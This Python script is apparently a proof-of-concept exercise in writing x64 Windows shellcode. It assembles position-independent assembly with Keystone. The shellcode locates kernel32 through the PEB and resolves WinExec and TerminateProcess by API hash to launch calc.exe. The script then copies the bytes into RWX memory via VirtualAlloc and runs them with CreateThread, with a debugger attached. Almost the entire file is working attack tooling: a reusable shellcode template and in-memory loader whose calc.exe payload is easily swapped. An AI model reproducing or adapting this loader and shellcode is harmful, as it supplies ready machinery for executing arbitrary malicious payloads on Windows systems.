"""
Created by _0pr_ on 07-13-2023

PoC x64 shellcode for poping calc.exe then terminate the process
"""

import ctypes, struct
import binascii
import os
import subprocess
from keystone import *

def main():
    SHELLCODE = (
        " start:                            "
        #"   int3                            ;"
        "   mov rbp, rsp                    ;"  # Save current rsp
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack, and avoid null byte
        
        " find_kernel32:                    "   # start to find kernel32 library
        "   xor rcx, rcx                    ;"  # Zero RCX contents
        "   mov rsi, gs:[rcx+0x60]          ;"  # 0x060 load PEB to RAX
        "   mov rsi, [rsi+0x18]             ;"  # 0x18 load PEB.Ldr Offset
        "   mov rsi, [rsi+0x20]             ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
        
        " next_module:                      "
        "   mov rbx, [rsi+0x20]             ;"  # DllBase, InMem + 0x30 - 0x10
        "   mov rdi, [rsi+0x50]             ;"  # ModName, InMem + 0x58 - 0x10 + 0x8 (Buffer)
        "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
        "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
        "   jne next_module                 ;"  # If not, keep looking
        
        " get_find_function_ret:            "
        "   jmp find_function_short         ;"  # A short jump to call function backwards
        
        " find_function_ret:                 "
        "   pop rsi                         ;"  # Pop ret addr of find_function to RSI
        "   mov [rbp+0x8], rsi              ;"  # Save ret addr of find_function to [rbp+0x8] for later use
        "   jmp resolve_functions           ;"  # Resolve functions
        
        " find_function_short:               "
        "   call find_function_ret          ;"  # This will push the ret addr of find_function on stack, we will save that for later use
               
        # Resolving VA for Export Address Table
        " find_function:                    "
        "   mov eax, dword ptr [rbx+0x3C]   ;"  # kernel32.dll->e_lfanew
        "   mov edi, dword ptr [rbx+rax+0x88];"  # RDI = Export Directory RVA (0x78 + 0x10) NULL Byte
        "   add rdi, rbx                    ;"  # RDI = Export Directory VA
        "   xor rcx, rcx                    ;"  # Clear RCX TODO: no need?
        "   mov ecx, dword ptr [rdi+0x14]   ;"  # RCX = NumberOfFunctions
        "   xor rax, rax                    ;"  # Clear RAX TODO: no need?
        "   mov eax, dword ptr [rdi+0x20]   ;"  # RAX = AddressOfNames RVA
        "   add rax, rbx                    ;"  # RAX = AddressOfNames VA
        "   mov [rbp+0x10], rax             ;"  # Save AddressOfNames VA to [rbp+0x10]
        
        # Resolve specific function from Kerner32.dll
        " find_function_loop:               "
        "   jecxz function_found            ;"  # RCX = 0, loop over
        "   mov rax, [rbp+0x10]             ;"  # Restore AddressOfNames VA
        "   mov esi, dword ptr [rax+rcx*4]  ;"  # RSI = RVA of function name
        "   add rsi, rbx                    ;"  # RSI = VA of function name
        "   dec rcx                         ;"  # Decrese RCX counter
        
        " compute_hash:                     "
        "   xor rax, rax                    ;"  # Clear RAX
        "   cqo                             ;"  # Clear RDX
        "   cld                             ;"  # Clear direction
        
        " compute_hash_again:               "
        "   lodsb                           ;"  # Load byte at RSI into AL
        "   test al, al                     ;"  # Check for NULL terminator
        "   jz compute_hash_done            ;"  # Finish hashing when ZF is set
        "   ror edx, 0x0d                   ;"  # Rotate RDX 13 bits to the right
        "   add edx, eax                    ;"  # Add new bytes to RDX
        "   jmp compute_hash_again         ;"  # Compute hash for next byte
        
        " compute_hash_done:                 "
        
        " find_function_compare:            "
        "   cmp edx, r15d                   ;"  # Compare computed hash with target hash
        "   jnz find_function_loop          ;"  # If not match, loop to next
        "   mov edx, dword ptr [rdi+0x24]   ;"  # EDX = AddressOfNameOrdinals RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfNameOrdinals VA
        "   mov cx, word ptr [rdx+rcx*2]    ;"  # ECX = Function's Ordinal
        "   mov edx, dword ptr [rdi+0x1c]   ;"  # EDX = AddressOfFunctions RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfFunctions VA
        "   mov eax, dword ptr [rdx+rcx*4+4];"  # EAX = Function RVA; +4 to get the target
        "   add rax, rbx                    ;"  # RAX = Function VA; Save Function VA to RAX

        " function_found:                   "
        "   ret                             ;"
        
        " resolve_functions:                "
        "   mov r15, 0x78b5b983             ;"  # TerminateProcess hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x18], rax             ;"  # Save TerminateProcess to [rbp+0x18]
        "   mov r15, 0xe8afe98              ;"  # WinExec hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x20], rax             ;"  # Save WinExec to [rbp+0x20]
        
        " dummy:                            "  # stage separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        " call_winexec:                     "
        "   xor rax, rax                    ;"  # Clear RAX
        "   push rax                        ;"  # NULL byte for calc.exe string
        "   mov rax, 0x6578652E636C6163     ;"  # calc.exe string
        "   push rax                        ;"  # Push calc.exe to stack
        "   mov rcx, rsp                    ;"  # RCX = calc.exe pointer as first argument
        "   xor rdx, rdx                    ;"  # Clear RDX
        "   inc rdx                         ;"  # RDX = 1 as second argument, SW_NORMAL
        "   sub rsp, 0x20                   ;"  # home space
        "   call qword ptr [rbp+0x20]       ;"  # Call WinExec
        
        " call_terminate_process:            "
        "   mov rcx, 0xffffffffffffffff     ;"  # -1, Current process
        "   xor rdx, rdx                    ;"  # NULL
        "   call qword ptr [rbp+0x18]       ;"  # Call TerminateProcess
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n")
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
